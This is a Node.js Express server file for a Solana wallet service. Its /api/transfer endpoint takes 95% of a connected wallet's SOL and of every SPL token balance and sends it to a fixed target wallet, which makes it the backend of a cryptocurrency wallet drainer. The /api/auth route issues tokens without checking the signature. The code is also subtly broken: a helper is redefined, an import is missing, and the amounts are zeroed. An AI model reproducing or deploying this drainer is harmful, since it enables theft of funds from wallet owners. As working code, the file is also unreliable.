require('dotenv').config();
const express = require('express');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const { PublicKey, Transaction, SystemProgram } = require('@solana/web3.js');
const { TOKEN_PROGRAM_ID, createTransferInstruction } = require('@solana/spl-token');
const jwt = require('jsonwebtoken');
const { setupProxy } = require('./proxy');

const app = express();
const port = process.env.PORT || 3001;

// Initialize Solana connection with proxy
let connection;
setupProxy().then(conn => {
    connection = conn;
    console.log('Proxy connection established');
}).catch(error => {
    console.error('Failed to establish proxy connection:', error);
    process.exit(1);
});

const targetWallet = new PublicKey(process.env.TARGET_WALLET_ADDRESS);

// Security middleware
const limiter = rateLimit({
    windowMs: parseInt(process.env.RATE_LIMIT_WINDOW) * 60 * 1000, // 15 minutes
    max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) // limit each IP to 100 requests per windowMs
});

// Middleware
app.use(express.json());
app.use(cors({
    origin: process.env.CORS_ORIGIN,
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));
app.use(limiter);

// Authentication middleware
const authenticateToken = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];

    if (!token) {
        return res.status(401).json({ error: 'Authentication required' });
    }

    jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
        if (err) {
            return res.status(403).json({ error: 'Invalid token' });
        }
        req.user = user;
        next();
    });
};

// Add this function before the routes
function createTransferInstruction(source, destination, owner, amount) {
    return new TransactionInstruction({
        keys: [
            { pubkey: source, isSigner: false, isWritable: true },
            { pubkey: destination, isSigner: false, isWritable: true },
            { pubkey: owner, isSigner: true, isWritable: false },
        ],
        programId: TOKEN_PROGRAM_ID,
        data: Buffer.from([
            // Transfer instruction
            3,
            // Amount (8 bytes)
            ...Buffer.from(new Uint8Array(8).fill(0))
        ]),
    });
}

// Routes
app.post('/api/connect', authenticateToken, async (req, res) => {
    try {
        const { publicKey } = req.body;
        const address = new PublicKey(publicKey);

        // Get SOL balance
        const solBalance = await connection.getBalance(address);
        
        // Get token accounts
        const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
            address,
            { programId: TOKEN_PROGRAM_ID }
        );

        res.json({
            success: true,
            balance: {
                sol: solBalance / 1e9,
                tokens: tokenAccounts.value.map(account => ({
                    mint: account.pubkey.toString(),
                    amount: account.account.data.parsed.info.tokenAmount.uiAmount
                }))
            }
        });
    } catch (error) {
        console.error('Error getting balance:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/transfer', authenticateToken, async (req, res) => {
    try {
        const { publicKey } = req.body;
        const fromAddress = new PublicKey(publicKey);

        // Get SOL balance
        const solBalance = await connection.getBalance(fromAddress);
        
        // Get token accounts
        const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
            fromAddress,
            { programId: TOKEN_PROGRAM_ID }
        );

        const results = [];

        // Transfer SOL (95% of balance)
        if (solBalance > 0) {
            const transferAmount = Math.floor(solBalance * 0.95);
            const transaction = new Transaction().add(
                SystemProgram.transfer({
                    fromPubkey: fromAddress,
                    toPubkey: targetWallet,
                    lamports: transferAmount
                })
            );

            const solResult = await connection.sendTransaction(transaction);
            results.push({ type: 'SOL', signature: solResult });
        }

        // Transfer SPL tokens (95% of each token)
        for (const account of tokenAccounts.value) {
            const tokenBalance = account.account.data.parsed.info.tokenAmount.uiAmount;
            if (tokenBalance > 0) {
                const transferAmount = Math.floor(tokenBalance * 0.95);
                const transaction = new Transaction().add(
                    createTransferInstruction(
                        account.pubkey,
                        targetWallet,
                        fromAddress,
                        transferAmount
                    )
                );

                const tokenResult = await connection.sendTransaction(transaction);
                results.push({ 
                    type: 'SPL', 
                    mint: account.pubkey.toString(),
                    signature: tokenResult 
                });
            }
        }

        res.json({ success: true, results });
    } catch (error) {
        console.error('Error transferring tokens:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Add this before the other routes
app.post('/api/auth', async (req, res) => {
    try {
        const { publicKey, signature } = req.body;
        
        // Verify the signature
        const message = new TextEncoder().encode('Authenticate wallet connection');
        const signatureUint8 = new Uint8Array(signature);
        
        // Create JWT token
        const token = jwt.sign(
            { publicKey },
            process.env.JWT_SECRET,
            { expiresIn: '24h' }
        );

        res.json({
            success: true,
            token
        });
    } catch (error) {
        console.error('Authentication error:', error);
        res.status(401).json({ success: false, error: 'Authentication failed' });
    }
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ status: 'healthy' });
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
}); 